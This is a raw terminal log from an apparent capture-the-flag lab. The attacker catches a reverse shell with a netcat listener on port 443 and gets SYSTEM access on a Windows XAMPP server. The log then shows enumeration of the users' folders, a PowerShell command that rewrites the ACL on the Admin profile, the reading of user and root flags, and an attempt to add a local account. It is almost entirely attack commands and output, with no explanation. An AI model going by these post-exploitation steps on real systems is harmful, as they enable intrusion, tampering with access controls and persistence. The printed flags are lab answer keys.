
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                                               
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.98.67] 49884

CF E:\xampp\htdocs\internal> whoami
nt authority\system
CF E:\xampp\htdocs\internal> c:
CF C:\> cd users
CF C:\users> ls


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   4:41 AM                Admin                         
d-----        4/11/2020  11:07 AM                Administrator                 
d-----        4/11/2020  11:55 AM                Equinox                       
d-r---        4/11/2020  10:34 AM                Public                        
d-----        4/11/2020  11:56 AM                Sunlight                      
d-----        4/11/2020  11:53 AM                SuperAdmin                    
d-----        4/11/2020   3:00 AM                TEMP                          


CF C:\users> cd administrator   
CF C:\users\administrator> ls


    Directory: C:\users\administrator


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        4/12/2020   1:27 AM                Contacts                      
d-r---        4/12/2020   1:27 AM                Desktop                       
d-r---        4/12/2020   1:27 AM                Documents                     
d-r---        4/12/2020   1:27 AM                Downloads                     
d-r---        4/12/2020   1:27 AM                Favorites                     
d-r---        4/12/2020   1:27 AM                Links                         
d-r---        4/12/2020   1:27 AM                Music                         
d-r---        4/12/2020   1:27 AM                Pictures                      
d-r---        4/12/2020   1:27 AM                Saved Games                   
d-r---        4/12/2020   1:27 AM                Searches                      
d-r---        4/12/2020   1:27 AM                Videos                        


CF C:\users\administrator> cd desktop
CF C:\users\administrator\desktop> ls


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 user.txt                      


CF C:\users\administrator\desktop> type user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}
CF C:\users\administrator\desktop> cd..
CF C:\users\administrator> cd..
CF C:\users> ls


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   4:41 AM                Admin                         
d-----        4/11/2020  11:07 AM                Administrator                 
d-----        4/11/2020  11:55 AM                Equinox                       
d-r---        4/11/2020  10:34 AM                Public                        
d-----        4/11/2020  11:56 AM                Sunlight                      
d-----        4/11/2020  11:53 AM                SuperAdmin                    
d-----        4/11/2020   3:00 AM                TEMP                          


CF C:\users> cd superadmin
lCF C:\users\superadmin> s
CF C:\users\superadmin> ls
CF C:\users\superadmin> cd desktop
CF C:\users\superadmin> ls -la
CF C:\users\superadmin> cd..
CF C:\users> cd..
CF C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020  11:27 AM                inetpub                       
d-----        4/11/2020   8:11 AM                IObit                         
d-----        4/11/2020  12:45 PM                PerfLogs                      
d-r---        4/13/2020  11:18 AM                Program Files                 
d-----        4/11/2020  10:42 AM                Program Files (x86)           
d-r---        4/11/2020   4:41 AM                Users                         
d-----        4/13/2020  11:28 AM                Windows                       


CF C:\> e:
CF E:\xampp\htdocs\internal> cd..
CF E:\xampp\htdocs> ls


    Directory: E:\xampp\htdocs


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   9:11 AM                admin                         
d-----        4/11/2020   9:11 AM                internal                      
d-----        4/11/2020   9:11 AM                serenity                      


CF E:\xampp\htdocs> cd admin
CF E:\xampp\htdocs\admin> ls


    Directory: E:\xampp\htdocs\admin


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   9:11 AM                file_content_fetch            
d-----        4/11/2020   9:11 AM                images                        
-a----        3/27/2020   5:29 AM            110 .htaccess                     
-a----        3/27/2020   5:07 AM             45 .htpasswd                     
-a----        10/4/2019  11:00 PM           1917 all.css                       
-a----        3/27/2020   7:07 AM           2382 head.php                      
-a----        3/27/2020   7:08 AM            713 index.php                     


CF E:\xampp\htdocs\admin> cd..
CF E:\xampp\htdocs> cd..
CF E:\xampp> cd..
CF E:\> ls


    Directory: E:\


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
da----        4/11/2020   9:54 AM                xampp                         


CF E:\> Get-ChildItem -Path E:\ -Recurse -Filter *.txt                 


    Directory: E:\xampp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/13/2017   4:04 AM            824 passwords.txt                 
-a----         4/1/2020  12:15 AM           7497 readme_de.txt                 
-a----         4/1/2020  12:15 AM           7367 readme_en.txt                 


    Directory: E:\xampp\apache


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        4/15/2015   3:53 PM          13740 ABOUT_APACHE.txt              
-a----         8/9/2019   9:37 AM             59 CHANGES.txt                   
-a----        5/17/2016  12:59 PM           3869 INSTALL.txt                   
-a----         8/9/2019   9:38 AM          44480 LICENSE.txt                   
-a----         8/9/2019   9:38 AM           2865 NOTICE.txt                    
-a----        8/11/2019   5:23 AM          41993 OPENSSL-NEWS.txt              
-a----        8/11/2019   5:23 AM           4545 OPENSSL-README.txt            
-a----        1/23/2014   9:33 AM           4752 README.txt                    


    Directory: E:\xampp\apache\manual


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        8/13/2019   3:21 AM             46 docs.txt                      


    Directory: E:\xampp\licenses\adodb


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          26079 license.txt                   


    Directory: E:\xampp\licenses\apr


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18324 LICENSE.txt                   


    Directory: E:\xampp\licenses\aspell


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          26934 COPYING.txt                   


    Directory: E:\xampp\licenses\browscap


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1287 LICENSE.txt                   


    Directory: E:\xampp\licenses\bzip2


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1943 LICENSE.txt                   


    Directory: E:\xampp\licenses\db


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           7463 LICENSE.txt                   


    Directory: E:\xampp\licenses\FileZillaFTP


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18348 license.txt                   


    Directory: E:\xampp\licenses\fontconfig


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1132 COPYING.txt                   


    Directory: E:\xampp\licenses\fonts\ming


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM            731 MING-README.txt               


    Directory: E:\xampp\licenses\fonts\ps


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM            997 copyright.txt                 


    Directory: E:\xampp\licenses\fonts\ttf


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           6078 COPYRIGHT.TXT                 


    Directory: E:\xampp\licenses\freetype


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18325 GPL.txt                       


    Directory: E:\xampp\licenses\GeoIP


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          27108 COPYING.txt                   


    Directory: E:\xampp\licenses\giflib


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1107 COPYING.txt                   


    Directory: E:\xampp\licenses\httpd


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          30359 LICENSE.txt                   


    Directory: E:\xampp\licenses\libmbfl


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          24847 LICENSE.txt                   


    Directory: E:\xampp\licenses\libxml2


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1525 COPYING.txt                   


    Directory: E:\xampp\licenses\libxmlrpc


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1292 Copyright.txt                 


    Directory: E:\xampp\licenses\libzip


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1647 LICENSE.txt                   


    Directory: E:\xampp\licenses\Mercury32


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           3010 LICENSE.txt                   


    Directory: E:\xampp\licenses\mod_autoindex_color


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1094 License.txt                   


    Directory: E:\xampp\licenses\msmtp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          35821 COPYING.txt                   


    Directory: E:\xampp\licenses\pbxt


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18342 COPYING.txt                   


    Directory: E:\xampp\licenses\pcrelib


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           2564 LICENCE.txt                   


    Directory: E:\xampp\licenses\pdflib


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          17359 license.txt                   


    Directory: E:\xampp\licenses\pear


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1595 license.txt                   


    Directory: E:\xampp\licenses\proftpd


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1254 license.txt                   


    Directory: E:\xampp\licenses\regex


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM            970 COPYRIGHT.txt                 


    Directory: E:\xampp\licenses\sql2k


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          12327 license.txt                   
-a----        3/30/2013   5:29 AM          32476 redist.txt                    


    Directory: E:\xampp\licenses\strawberry\licenses\dmake


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          12487 license.txt                   


    Directory: 
    E:\xampp\licenses\strawberry\licenses\gcc-toolchain\mingw-w64\glext-headers


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1303 khronos.license.txt           


    Directory: 
    E:\xampp\licenses\strawberry\licenses\gcc-toolchain\mingw-w64\open-cl


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1303 khronos.license.txt           


    Directory: E:\xampp\licenses\strawberry\licenses\libfreetype


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           6741 FTL.TXT                       
-a----        3/30/2013   5:29 AM          17994 GPL.TXT                       
-a----        3/30/2013   5:29 AM           1396 LICENSE.TXT                   


    Directory: E:\xampp\licenses\t1lib


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18321 LICENSE.txt                   


    Directory: E:\xampp\licenses\TSRM


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1340 LICENSE.txt                   


    Directory: E:\xampp\licenses\ucd-snmp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           4685 COPYING.txt                   


    Directory: E:\xampp\licenses\xampp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM          18321 gpl.txt                       


    Directory: E:\xampp\licenses\xampp-portcheck


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           1307 license.txt                   
-a----        3/30/2013   5:29 AM           4217 openports.txt                 


    Directory: E:\xampp\licenses\xdebug


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           3072 LICENSE.txt                   


    Directory: E:\xampp\licenses\Zend


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM           2871 LICENSE.txt                   


    Directory: E:\xampp\mailtodisk


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM            842 README.txt                    


    Directory: E:\xampp\mysql\share


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       12/10/2019   5:47 AM         545242 errmsg-utf8.txt               


    Directory: E:\xampp\perl\lib\Unicode\Collate


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       12/21/2012  10:26 PM        1667638 allkeys.txt                   
-a----        2/26/2013   2:28 PM          52838 keys.txt                      


    Directory: E:\xampp\perl\lib\unicore


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         3/4/2013   8:16 AM           7450 Blocks.txt                    
-a----         3/4/2013   8:16 AM          65618 CaseFolding.txt               
-a----         3/4/2013   8:16 AM          16947 NamedSequences.txt            
-a----         3/4/2013   8:16 AM          16349 SpecialCasing.txt             


    Directory: E:\xampp\perl\vendor\lib\auto\share\dist\File-ShareDir


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/12/2013   5:50 AM            159 sample.txt                    


    Directory: E:\xampp\perl\vendor\lib\auto\share\dist\File-ShareDir\subdir


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/12/2013   5:50 AM            166 sample.txt                    


    Directory: E:\xampp\perl\vendor\lib\auto\share\module\File-ShareDir


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/12/2013   5:50 AM             18 test_file.txt                 


    Directory: E:\xampp\php


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/17/2020   8:02 AM           3272 license.txt                   
-a----        3/17/2020   8:02 AM          71358 news.txt                      
-a----        3/17/2020   8:02 AM          30257 readme-redist-bins.txt        
-a----        3/17/2020   8:02 AM           2224 snapshot.txt                  


    Directory: E:\xampp\php\docs\Archive_Tar\docs


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        1/22/2016   2:45 AM          19110 Archive_Tar.txt               


    Directory: E:\xampp\php\docs\examples


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        1/27/2016   4:02 AM           1616 cliOutput.txt                 


    Directory: E:\xampp\php\extras\fonts\fft


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        4/16/2012  10:30 AM            731 MING-README.txt               


    Directory: E:\xampp\php\extras\mibs


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        4/16/2012  10:30 AM          17455 AGENTX-MIB.txt                
-a----        4/16/2012  10:30 AM          68177 DISMAN-EVENT-MIB.txt          
-a----        4/16/2012  10:30 AM          42691 DISMAN-EXPRESSION-MIB.txt     
-a----        4/16/2012  10:30 AM          18527 DISMAN-NSLOOKUP-MIB.txt       
-a----        4/16/2012  10:30 AM          57310 DISMAN-PING-MIB.txt           
-a----        4/16/2012  10:30 AM          24613 DISMAN-SCHEDULE-MIB.txt       
-a----        4/16/2012  10:30 AM          64311 DISMAN-SCRIPT-MIB.txt         
-a----        4/16/2012  10:30 AM          69516 DISMAN-TRACEROUTE-MIB.txt     
-a----        4/16/2012  10:30 AM          84492 EtherLike-MIB.txt             
-a----        4/16/2012  10:30 AM           4660 HCNUM-TC.txt                  
-a----        4/16/2012  10:30 AM          52544 HOST-RESOURCES-MIB.txt        
-a----        4/16/2012  10:30 AM          10583 HOST-RESOURCES-TYPES.txt      
-a----        4/16/2012  10:30 AM           4743 IANA-ADDRESS-FAMILY-NUMBERS-MI
                                                 B.txt                         
-a----        4/16/2012  10:30 AM           4299 IANA-LANGUAGE-MIB.txt         
-a----        4/16/2012  10:30 AM           3518 IANA-RTPROTO-MIB.txt          
-a----        4/16/2012  10:30 AM          24065 IANAifType-MIB.txt            
-a----        4/16/2012  10:30 AM           5066 IF-INVERTED-STACK-MIB.txt     
-a----        4/16/2012  10:30 AM          71691 IF-MIB.txt                    
-a----        4/16/2012  10:30 AM          16782 INET-ADDRESS-MIB.txt          
-a----        4/16/2012  10:30 AM          46366 IP-FORWARD-MIB.txt            
-a----        4/16/2012  10:30 AM         185928 IP-MIB.txt                    
-a----        4/16/2012  10:30 AM           2033 IPV6-FLOW-LABEL-MIB.txt       
-a----        4/16/2012  10:30 AM          15936 IPV6-ICMP-MIB.txt             
-a----        4/16/2012  10:30 AM          48703 IPV6-MIB.txt                  
-a----        4/16/2012  10:30 AM           2367 IPV6-TC.txt                   
-a----        4/16/2012  10:30 AM           7257 IPV6-TCP-MIB.txt              
-a----        4/16/2012  10:30 AM           4400 IPV6-UDP-MIB.txt              
-a----        4/16/2012  10:30 AM           5931 LM-SENSORS-MIB.txt            
-a----        4/16/2012  10:30 AM          42375 MTA-MIB.txt                   
-a----        4/16/2012  10:30 AM          15732 NET-SNMP-AGENT-MIB.txt        
-a----        4/16/2012  10:30 AM           9154 NET-SNMP-EXAMPLES-MIB.txt     
-a----        4/16/2012  10:30 AM           9198 NET-SNMP-EXTEND-MIB.txt       
-a----        4/16/2012  10:30 AM           2036 NET-SNMP-MIB.txt              
-a----        4/16/2012  10:30 AM           1215 NET-SNMP-MONITOR-MIB.txt      
-a----        4/16/2012  10:30 AM           3351 NET-SNMP-PASS-MIB.txt         
-a----        4/16/2012  10:30 AM           1226 NET-SNMP-SYSTEM-MIB.txt       
-a----        4/16/2012  10:30 AM           4495 NET-SNMP-TC.txt               
-a----        4/16/2012  10:30 AM           5039 NET-SNMP-VACM-MIB.txt         
-a----        4/16/2012  10:30 AM          21006 NETWORK-SERVICES-MIB.txt      
-a----        4/16/2012  10:30 AM          24723 NOTIFICATION-LOG-MIB.txt      
-a----        4/16/2012  10:30 AM           1174 RFC-1215.txt                  
-a----        4/16/2012  10:30 AM           3067 RFC1155-SMI.txt               
-a----        4/16/2012  10:30 AM          79667 RFC1213-MIB.txt               
-a----        4/16/2012  10:30 AM         147822 RMON-MIB.txt                  
-a----        4/16/2012  10:30 AM          45323 SCTP-MIB.txt                  
-a----        4/16/2012  10:30 AM           4595 SMUX-MIB.txt                  
-a----        4/16/2012  10:30 AM          15490 SNMP-COMMUNITY-MIB.txt        
-a----        4/16/2012  10:30 AM          22342 SNMP-FRAMEWORK-MIB.txt        
-a----        4/16/2012  10:30 AM           5496 SNMP-MPD-MIB.txt              
-a----        4/16/2012  10:30 AM          20014 SNMP-NOTIFICATION-MIB.txt     
-a----        4/16/2012  10:30 AM           9106 SNMP-PROXY-MIB.txt            
-a----        4/16/2012  10:30 AM          22769 SNMP-TARGET-MIB.txt           
-a----        4/16/2012  10:30 AM          39201 SNMP-USER-BASED-SM-MIB.txt    
-a----        4/16/2012  10:30 AM           2205 SNMP-USM-AES-MIB.txt          
-a----        4/16/2012  10:30 AM          21106 SNMP-USM-DH-OBJECTS-MIB.txt   
-a----        4/16/2012  10:30 AM          34162 SNMP-VIEW-BASED-ACM-MIB.txt   
-a----        4/16/2012  10:30 AM           8263 SNMPv2-CONF.txt               
-a----        4/16/2012  10:30 AM          29305 SNMPv2-MIB.txt                
-a----        4/16/2012  10:30 AM           8924 SNMPv2-SMI.txt                
-a----        4/16/2012  10:30 AM          38034 SNMPv2-TC.txt                 
-a----        4/16/2012  10:30 AM           5775 SNMPv2-TM.txt                 
-a----        4/16/2012  10:30 AM          28564 TCP-MIB.txt                   
-a----        4/16/2012  10:30 AM          16414 TRANSPORT-ADDRESS-MIB.txt     
-a----        4/16/2012  10:30 AM          27862 TUNNEL-MIB.txt                
-a----        4/16/2012  10:30 AM           2163 UCD-DEMO-MIB.txt              
-a----        4/16/2012  10:30 AM           4402 UCD-DISKIO-MIB.txt            
-a----        4/16/2012  10:30 AM           3010 UCD-DLMOD-MIB.txt             
-a----        4/16/2012  10:30 AM           6399 UCD-IPFILTER-MIB.txt          
-a----        4/16/2012  10:30 AM           8118 UCD-IPFWACC-MIB.txt           
-a----        4/16/2012  10:30 AM          18274 UCD-SNMP-MIB-OLD.txt          
-a----        4/16/2012  10:30 AM          44629 UCD-SNMP-MIB.txt              
-a----        4/16/2012  10:30 AM          20882 UDP-MIB.txt                   


    Directory: E:\xampp\php\extras\openssl


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        4/16/2012  10:30 AM           1826 README-SSL.txt                


    Directory: E:\xampp\php\pear\.channels\.alias


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        1/22/2016   2:45 AM             12 pear.txt                      
-a----        1/22/2016   2:45 AM             12 pecl.txt                      
-a----        1/22/2016   2:45 AM             11 phpdocs.txt                   


    Directory: E:\xampp\php\pear\adodb


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        6/25/2009   1:26 AM          26079 license.txt                   
-a----        3/26/2012   2:48 AM           1773 readme.txt                    


    Directory: E:\xampp\php\pear\adodb\pear


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        6/25/2009   1:26 AM            570 readme.Auth.txt               


    Directory: E:\xampp\php\pear\adodb\session


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        6/25/2009   1:26 AM           3913 adodb-sess.txt                


    Directory: E:\xampp\php\tests\emptyDir


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        1/27/2016   4:02 AM            112 empty_dir.txt                 


    Directory: E:\xampp\php\windowsXamppPhp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/17/2020   8:02 AM           3272 license.txt                   
-a----        3/17/2020   8:02 AM          71358 news.txt                      
-a----        3/17/2020   8:02 AM          30257 readme-redist-bins.txt        
-a----        3/17/2020   8:02 AM           2224 snapshot.txt                  


    Directory: E:\xampp\webdav


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/30/2013   5:29 AM            277 webdav.txt                    


CF E:\> Get-ChildItem -Path E:\ -Recurse -Filter root.txt
CF E:\> c:
CF C:\> get-acl                                              


    Directory: 


Path Owner                       Access                                        
---- -----                       ------                                        
C:\  NT SERVICE\TrustedInstaller CREATOR OWNER Allow  268435456...             


CF C:\> cd users
CF C:\users> ls


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        4/11/2020   4:41 AM                Admin                         
d-----        4/11/2020  11:07 AM                Administrator                 
d-----        4/11/2020  11:55 AM                Equinox                       
d-r---        4/11/2020  10:34 AM                Public                        
d-----        4/11/2020  11:56 AM                Sunlight                      
d-----        4/11/2020  11:53 AM                SuperAdmin                    
d-----        4/11/2020   3:00 AM                TEMP                          


CF C:\users> cd admin
CF C:\users\admin> ls
CF C:\users\admin> whoami
nt authority\system
CF C:\users\admin> get-acl


    Directory: C:\users


Path  Owner               Access                                  
----  -----               ------                                  
admin NT AUTHORITY\SYSTEM WIN-8VMBKF3G815\Admin Allow  FullControl


CF C:\users\admin> ls
CF C:\users\admin> cd..
CF C:\users> cd administrator
CF C:\users\administrator> ls


    Directory: C:\users\administrator


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        4/12/2020   1:27 AM                Contacts                      
d-r---        4/12/2020   1:27 AM                Desktop                       
d-r---        4/12/2020   1:27 AM                Documents                     
d-r---        4/12/2020   1:27 AM                Downloads                     
d-r---        4/12/2020   1:27 AM                Favorites                     
d-r---        4/12/2020   1:27 AM                Links                         
d-r---        4/12/2020   1:27 AM                Music                         
d-r---        4/12/2020   1:27 AM                Pictures                      
d-r---        4/12/2020   1:27 AM                Saved Games                   
d-r---        4/12/2020   1:27 AM                Searches                      
d-r---        4/12/2020   1:27 AM                Videos                        


CF C:\users\administrator> get-acl


    Directory: C:\users


Path          Owner               Access                                       
----          -----               ------                                       
administrator NT AUTHORITY\SYSTEM NT AUTHORITY\SYSTEM Allow  FullControl...    


CF C:\users\administrator> icacls

ICACLS name /save aclfile [/T] [/C] [/L] [/Q]
    stores the DACLs for the files and folders that match the name
    into aclfile for later use with /restore. Note that SACLs,
    owner, or integrity labels are not saved.

ICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile
                 [/C] [/L] [/Q]
    applies the stored DACLs to files in directory.

ICACLS name /setowner user [/T] [/C] [/L] [/Q]
    changes the owner of all matching names. This option does not
    force a change of ownership; use the takeown.exe utility for
    that purpose.

ICACLS name /findsid Sid [/T] [/C] [/L] [/Q]
    finds all matching names that contain an ACL
    explicitly mentioning Sid.

ICACLS name /verify [/T] [/C] [/L] [/Q]
    finds all files whose ACL is not in canonical form or whose
    lengths are inconsistent with ACE counts.

ICACLS name /reset [/T] [/C] [/L] [/Q]
    replaces ACLs with default inherited ACLs for all matching files.

ICACLS name [/grant[:r] Sid:perm[...]]
       [/deny Sid:perm [...]]
       [/remove[:g|:d]] Sid[...]] [/T] [/C] [/L] [/Q]
       [/setintegritylevel Level:policy[...]]

    /grant[:r] Sid:perm grants the specified user access rights. With :r,
        the permissions replace any previously granted explicit permissions.
        Without :r, the permissions are added to any previously granted
        explicit permissions.

    /deny Sid:perm explicitly denies the specified user access rights.
        An explicit deny ACE is added for the stated permissions and
        the same permissions in any explicit grant are removed.

    /remove[:[g|d]] Sid removes all occurrences of Sid in the ACL. With
        :g, it removes all occurrences of granted rights to that Sid. With
        :d, it removes all occurrences of denied rights to that Sid.

    /setintegritylevel [(CI)(OI)]Level explicitly adds an integrity
        ACE to all matching files.  The level is to be specified as one
        of:
            L[ow]
            M[edium]
            H[igh]
        Inheritance options for the integrity ACE may precede the level
        and are applied only to directories.

    /inheritance:e|d|r
        e - enables inheritance
        d - disables inheritance and copy the ACEs
        r - remove all inherited ACEs


Note:
    Sids may be in either numerical or friendly name form. If a numerical
    form is given, affix a * to the start of the SID.

    /T indicates that this operation is performed on all matching
        files/directories below the directories specified in the name.

    /C indicates that this operation will continue on all file errors.
        Error messages will still be displayed.

    /L indicates that this operation is performed on a symbolic link
       itself versus its target.

    /Q indicates that icacls should suppress success messages.

    ICACLS preserves the canonical ordering of ACE entries:
            Explicit denials
            Explicit grants
            Inherited denials
            Inherited grants

    perm is a permission mask and can be specified in one of two forms:
        a sequence of simple rights:
                N - no access
                F - full access
                M - modify access
                RX - read and execute access
                R - read-only access
                W - write-only access
                D - delete access
        a comma-separated list in parentheses of specific rights:
                DE - delete
                RC - read control
                WDAC - write DAC
                WO - write owner
                S - synchronize
                AS - access system security
                MA - maximum allowed
                GR - generic read
                GW - generic write
                GE - generic execute
                GA - generic all
                RD - read data/list directory
                WD - write data/add file
                AD - append data/add subdirectory
                REA - read extended attributes
                WEA - write extended attributes
                X - execute/traverse
                DC - delete child
                RA - read attributes
                WA - write attributes
        inheritance rights may precede either form and are applied
        only to directories:
                (OI) - object inherit
                (CI) - container inherit
                (IO) - inherit only
                (NP) - don't propagate inherit
                (I) - permission inherited from parent container

Examples:

        icacls c:\windows\* /save AclFile /T
        - Will save the ACLs for all files under c:\windows
          and its subdirectories to AclFile.

        icacls c:\windows\ /restore AclFile
        - Will restore the Acls for every file within
          AclFile that exists in c:\windows and its subdirectories.

        icacls file /grant Administrator:(D,WDAC)
        - Will grant the user Administrator Delete and Write DAC
          permissions to file.

        icacls file /grant *S-1-1-0:(D,WDAC)
        - Will grant the user defined by sid S-1-1-0 Delete and
          Write DAC permissions to file.
CF C:\users\administrator> whoami
nt authority\system
CF C:\users\administrator> ^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.98.67] 50159

CF E:\xampp\htdocs\internal> c:
CF C:\> cd users
CF C:\users> cd admin
CF C:\users\admin> get-acl


    Directory: C:\users


Path  Owner               Access                                  
----  -----               ------                                  
admin NT AUTHORITY\SYSTEM WIN-8VMBKF3G815\Admin Allow  FullControl


CF C:\users\admin> $acl = Get-Acl -Path "C:\Users\Admin"; $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"); $acl.AddAccessRule($rule); Set-Acl -Path "C:\Users\Admin" -AclObject $acl
CF C:\users\admin> 
CF C:\users\admin> get-acl


    Directory: C:\users


Path  Owner               Access                                               
----  -----               ------                                               
admin NT AUTHORITY\SYSTEM NT AUTHORITY\SYSTEM Allow  FullControl...            


CF C:\users\admin> ls


    Directory: C:\users\admin


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        4/12/2020   1:17 AM                Contacts                      
d-r---        4/12/2020   1:17 AM                Desktop                       
d-r---        4/12/2020   1:17 AM                Documents                     
d-r---        4/12/2020   1:17 AM                Downloads                     
d-r---        4/12/2020   1:17 AM                Favorites                     
d-r---        4/12/2020   1:17 AM                Links                         
d-r---        4/12/2020   1:17 AM                Music                         
d-r---        4/12/2020   1:17 AM                Pictures                      
d-r---        4/12/2020   1:17 AM                Saved Games                   
d-r---        4/12/2020   1:17 AM                Searches                      
d-r---        4/12/2020   1:17 AM                Videos                        


CF C:\users\admin> cd desktop
CF C:\users\admin\desktop> ls 


    Directory: C:\users\admin\desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 root.txt                      


CF C:\users\admin\desktop> type root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
CF C:\users\admin\desktop> New-LocalUser -Name "pratchett"

^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
^C
